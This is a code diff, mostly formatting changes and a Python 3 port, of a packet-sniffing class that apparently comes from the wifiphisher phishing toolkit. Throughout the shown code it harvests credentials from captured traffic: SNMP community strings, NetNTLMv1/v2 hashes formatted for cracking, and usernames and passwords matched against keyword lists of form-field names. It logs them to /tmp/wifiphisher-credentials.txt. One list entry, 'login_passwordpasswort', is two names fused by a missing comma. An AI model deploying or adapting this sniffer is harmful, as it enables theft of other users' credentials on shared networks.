     def parse_snmp(self, src_ip_port, dst_ip_port, snmp_layer):
-        '''
+        """
         Parse out the SNMP version and community string
-        '''
+        """
         if type(snmp_layer.community.val) == str:
             ver = snmp_layer.version.val
-            msg = 'SNMPv%d community string: %s' % (ver, snmp_layer.community.val)
+            msg = "SNMPv%d community string: %s" % (ver, snmp_layer.community.val)
             self.printer(src_ip_port, dst_ip_port, msg)
         return True
 
     def get_http_url(self, method, host, path, headers):
-        '''
+        """
         Get the HTTP method + URL from requests
-        '''
+        """
         if method != None and path != None:
-
             # Make sure the path doesn't repeat the host header
-            if host != '' and not re.match('(http(s)?://)?'+host, path):
-                http_url_req = method + ' ' + host + path
+            if host != "" and not re.match("(http(s)?://)?" + host, path):
+                http_url_req = method + " " + host + path
             else:
-                http_url_req = method + ' ' + path
+                http_url_req = method + " " + path
 
             http_url_req = self.url_filter(http_url_req)
 
             return http_url_req
 
     def headers_to_dict(self, header_lines):
-        '''
+        """
         Convert the list of header lines into a dictionary
-        '''
+        """
         headers = {}
         for line in header_lines:
-            lineList=line.split(': ', 1)
-            key=lineList[0].lower()
-            if len(lineList)>1:
-                    headers[key]=lineList[1]
+            lineList = line.split(": ", 1)
+            key = lineList[0].lower()
+            if len(lineList) > 1:
+                headers[key] = lineList[1]
             else:
-                    headers[key]=""
+                headers[key] = ""
         return headers
 
     def parse_http_line(self, http_line, http_methods):
-        '''
+        """
         Parse the header with the HTTP method in it
-        '''
+        """
         http_line_split = http_line.split()
-        method = ''
-        path = ''
+        method = ""
+        path = ""
 
         # Accounts for pcap files that might start with a fragment
         # so the first line might be just text data
@@ -752,28 +838,28 @@ class Sniffer (object):
         #     HTTP/1.1 407 Proxy Authentication Required ( Access is denied.  )
         # Add a space to method because there's a space in http_methods items
         # to avoid false+
-        if method+' ' not in http_methods:
+        if method + " " not in http_methods:
             method = None
             path = None
 
         return method, path
 
     def parse_http_load(self, full_load, http_methods):
-        '''
+        """
         Split the raw load into list of headers and body string
-        '''
+        """
         try:
             headers, body = full_load.split("\r\n\r\n", 1)
         except ValueError:
             headers = full_load
-            body = ''
+            body = ""
         header_lines = headers.split("\r\n")
 
         # Pkts may just contain hex data and no headers in which case we'll
         # still want to parse them for usernames and password
         http_line = self.get_http_line(header_lines, http_methods)
         if not http_line:
-            headers = ''
+            headers = ""
             body = full_load
 
         header_lines = [line for line in header_lines if line != http_line]
@@ -781,9 +867,9 @@ class Sniffer (object):
         return http_line, header_lines, body
 
     def get_http_line(self, header_lines, http_methods):
-        '''
+        """
         Get the header with the http command
-        '''
+        """
         for header in header_lines:
             for method in http_methods:
                 # / is the only char I can think of that's in every http_line
@@ -793,37 +879,37 @@ class Sniffer (object):
                     return http_line
 
     def parse_netntlm_chal(self, headers, chal_header, ack):
-        '''
+        """
         Parse the netntlm server challenge
         https://code.google.com/p/python-ntlm/source/browse/trunk/python26/ntlm/ntlm.py
-        '''
+        """
         try:
             header_val2 = headers[chal_header]
         except KeyError:
             return
-        header_val2 = header_val2.split(' ', 1)
+        header_val2 = header_val2.split(" ", 1)
         # The header value can either start with NTLM or Negotiate
-        if header_val2[0] == 'NTLM' or header_val2[0].lower() == 'negotiate':
+        if header_val2[0] == "NTLM" or header_val2[0].lower() == "negotiate":
             try:
                 msg2 = header_val2[1]
             except IndexError:
                 return
-            msg2 = base64.decodestring(msg2)
+            msg2 = base64.decodebytes(msg2)
             self.parse_ntlm_chal(msg2, ack)
 
     def parse_ntlm_chal(self, msg2, ack):
-        '''
+        """
         Parse server challenge
-        '''
+        """
         global challenge_acks
 
         Signature = msg2[0:8]
         try:
-            msg_type = struct.unpack("<I",msg2[8:12])[0]
-            assert(msg_type==2)
+            msg_type = struct.unpack("<I", msg2[8:12])[0]
+            assert msg_type == 2
         except Exception:
             return
-        ServerChallenge = msg2[24:32].encode('hex')
+        ServerChallenge = msg2[24:32].hex()
 
         # Keep the dict of ack:challenge to less than 50 chals
         if len(self.challenge_acks) > 50:
@@ -831,84 +917,184 @@ class Sniffer (object):
         self.challenge_acks[ack] = ServerChallenge
 
     def parse_netntlm_resp_msg(self, headers, resp_header, seq):
-        '''
+        """
         Parse the client response to the challenge
-        '''
+        """
         try:
             header_val3 = headers[resp_header]
         except KeyError:
             return
-        header_val3 = header_val3.split(' ', 1)
+        header_val3 = header_val3.split(" ", 1)
 
         # The header value can either start with NTLM or Negotiate
-        if header_val3[0] == 'NTLM' or header_val3[0] == 'Negotiate':
+        if header_val3[0] == "NTLM" or header_val3[0] == "Negotiate":
             try:
-                msg3 = base64.decodestring(header_val3[1])
+                msg3 = base64.decodebytes(header_val3[1])
             except binascii.Error:
                 return
             return self.parse_ntlm_resp(msg3, seq)
 
     def parse_ntlm_resp(self, msg3, seq):
-        '''
+        """
         Parse the 3rd msg in NTLM handshake
         Thanks to psychomario
-        '''
+        """
 
         if seq in self.challenge_acks:
             challenge = self.challenge_acks[seq]
         else:
-            challenge = 'CHALLENGE NOT FOUND'
+            challenge = "CHALLENGE NOT FOUND"
 
         if len(msg3) > 43:
             # Thx to psychomario for below
-            lmlen, lmmax, lmoff, ntlen, ntmax, ntoff, domlen, dommax, domoff, userlen, usermax, useroff = struct.unpack("12xhhihhihhihhi", msg3[:44])
-            lmhash = binascii.b2a_hex(msg3[lmoff:lmoff+lmlen])
-            nthash = binascii.b2a_hex(msg3[ntoff:ntoff+ntlen])
-            domain = msg3[domoff:domoff+domlen].replace("\0", "")
-            user = msg3[useroff:useroff+userlen].replace("\0", "")
+            (
+                lmlen,
+                lmmax,
+                lmoff,
+                ntlen,
+                ntmax,
+                ntoff,
+                domlen,
+                dommax,
+                domoff,
+                userlen,
+                usermax,
+                useroff,
+            ) = struct.unpack("12xhhihhihhihhi", msg3[:44])
+            lmhash = binascii.b2a_hex(msg3[lmoff : lmoff + lmlen])
+            nthash = binascii.b2a_hex(msg3[ntoff : ntoff + ntlen])
+            domain = msg3[domoff : domoff + domlen].replace("\0", "")
+            user = msg3[useroff : useroff + userlen].replace("\0", "")
             # Original check by psychomario, might be incorrect?
-            #if lmhash != "0"*48: #NTLMv1
-            if ntlen == 24: #NTLMv1
-                msg = '%s %s' % ('NETNTLMv1:', user+"::"+domain+":"+lmhash+":"+nthash+":"+challenge)
+            # if lmhash != "0"*48: #NTLMv1
+            if ntlen == 24:  # NTLMv1
+                msg = "%s %s" % (
+                    "NETNTLMv1:",
+                    user
+                    + "::"
+                    + domain
+                    + ":"
+                    + lmhash
+                    + ":"
+                    + nthash
+                    + ":"
+                    + challenge,
+                )
                 return msg
-            elif ntlen > 60: #NTLMv2
-                msg = '%s %s' % ('NETNTLMv2:', user+"::"+domain+":"+challenge+":"+nthash[:32]+":"+nthash[32:])
+            elif ntlen > 60:  # NTLMv2
+                msg = "%s %s" % (
+                    "NETNTLMv2:",
+                    user
+                    + "::"
+                    + domain
+                    + ":"
+                    + challenge
+                    + ":"
+                    + nthash[:32]
+                    + ":"
+                    + nthash[32:],
+                )
                 return msg
 
     def url_filter(self, http_url_req):
-        '''
+        """
         Filter out the common but uninteresting URLs
-        '''
+        """
         if http_url_req:
-            d = ['.jpg', '.jpeg', '.gif', '.png', '.css', '.ico', '.js', '.svg', '.woff']
+            d = [
+                ".jpg",
+                ".jpeg",
+                ".gif",
+                ".png",
+                ".css",
+                ".ico",
+                ".js",
+                ".svg",
+                ".woff",
+            ]
             if any(http_url_req.endswith(i) for i in d):
                 return
 
         return http_url_req
 
     def get_login_pass(self, body):
-        '''
+        """
         Regex out logins and passwords from a string
-        '''
+        """
         user = None
         passwd = None
 
         # Taken mainly from Pcredz by Laurent Gaffie
-        userfields = ['log','login', 'wpname', 'ahd_username', 'unickname', 'nickname', 'user', 'user_name',
-                    'alias', 'pseudo', 'email', 'username', '_username', 'userid', 'form_loginname', 'loginname',
-                    'login_id', 'loginid', 'session_key', 'sessionkey', 'pop_login', 'uid', 'id', 'user_id', 'screename',
-                    'uname', 'ulogin', 'acctname', 'account', 'member', 'mailaddress', 'membername', 'login_username',
-                    'login_email', 'loginusername', 'loginemail', 'uin', 'sign-in', 'usuario']
-        passfields = ['ahd_password', 'pass', 'password', '_password', 'passwd', 'session_password', 'sessionpassword', 
-                    'login_password', 'loginpassword', 'form_pw', 'pw', 'userpassword', 'pwd', 'upassword', 'login_password'
-                    'passwort', 'passwrd', 'wppassword', 'upasswd','senha','contrasena']
+        userfields = [
+            "log",
+            "login",
+            "wpname",
+            "ahd_username",
+            "unickname",
+            "nickname",
+            "user",
+            "user_name",
+            "alias",
+            "pseudo",
+            "email",
+            "username",
+            "_username",
+            "userid",
+            "form_loginname",
+            "loginname",
+            "login_id",
+            "loginid",
+            "session_key",
+            "sessionkey",
+            "pop_login",
+            "uid",
+            "id",
+            "user_id",
+            "screename",
+            "uname",
+            "ulogin",
+            "acctname",
+            "account",
+            "member",
+            "mailaddress",
+            "membername",
+            "login_username",
+            "login_email",
+            "loginusername",
+            "loginemail",
+            "uin",
+            "sign-in",
+            "usuario",
+        ]
+        passfields = [
+            "ahd_password",
+            "pass",
+            "password",
+            "_password",
+            "passwd",
+            "session_password",
+            "sessionpassword",
+            "login_password",
+            "loginpassword",
+            "form_pw",
+            "pw",
+            "userpassword",
+            "pwd",
+            "upassword",
+            "login_passwordpasswort",
+            "passwrd",
+            "wppassword",
+            "upasswd",
+            "senha",
+            "contrasena",
+        ]
 
         for login in userfields:
-            login_re = re.search('(%s=[^&]+)' % login, body, re.IGNORECASE)
+            login_re = re.search("(%s=[^&]+)" % login, body, re.IGNORECASE)
             if login_re:
                 user = login_re.group()
         for passfield in passfields:
-            pass_re = re.search('(%s=[^&]+)' % passfield, body, re.IGNORECASE)
+            pass_re = re.search("(%s=[^&]+)" % passfield, body, re.IGNORECASE)
             if pass_re:
                 passwd = pass_re.group()
 
@@ -917,32 +1103,39 @@ class Sniffer (object):
 
     def printer(self, src_ip_port, dst_ip_port, msg):
         if dst_ip_port != None:
-            print_str = '[%s > %s] %s%s%s' % (src_ip_port, dst_ip_port, self.T, msg, self.W)
+            print_str = "[%s > %s] %s%s%s" % (
+                src_ip_port,
+                dst_ip_port,
+                self.T,
+                msg,
+                self.W,
+            )
             # All credentials will have dst_ip_port, URLs will not
 
             # Prevent identical outputs unless it's an HTTP search or POST load
-            skip = ['Searched ', 'POST load:']
+            skip = ["Searched ", "POST load:"]
             for s in skip:
                 if s not in msg:
-                    if os.path.isfile('/tmp/wifiphisher-credentials.txt'):
-                        with open('/tmp/wifiphisher-credentials.txt', 'r') as log:
+                    if os.path.isfile("/tmp/wifiphisher-credentials.txt"):
+                        with open("/tmp/wifiphisher-credentials.txt", "r") as log:
                             contents = log.read()
                             if msg in contents:
                                 return
 
             # Escape colors like whatweb has
-            ansi_escape = re.compile(r'\x1b[^m]*m')
-            print_str = ansi_escape.sub('', print_str)
+            ansi_escape = re.compile(r"\x1b[^m]*m")
+            print_str = ansi_escape.sub("", print_str)
 
             # Log the creds
-            with open('/tmp/wifiphisher-credentials.txt', 'a') as log:
-                log.write(print_str+'\n')
-            
+            with open("/tmp/wifiphisher-credentials.txt", "a") as log:
+                log.write(print_str + "\n")
+
         else:
-            print_str = '[%s] %s' % (src_ip_port.split(':')[0], msg)
+            print_str = "[%s] %s" % (src_ip_port.split(":")[0], msg)
             with open(self.requests_file_path, "a+") as log:
-                log.write(print_str+'\n')
+                log.write(print_str + "\n")
+
 
 def sniffTraffic(iface):
-    sn=Sniffer()
+    sn = Sniffer()
     sniff(iface=iface, prn=sn.pkt_parser, store=0)
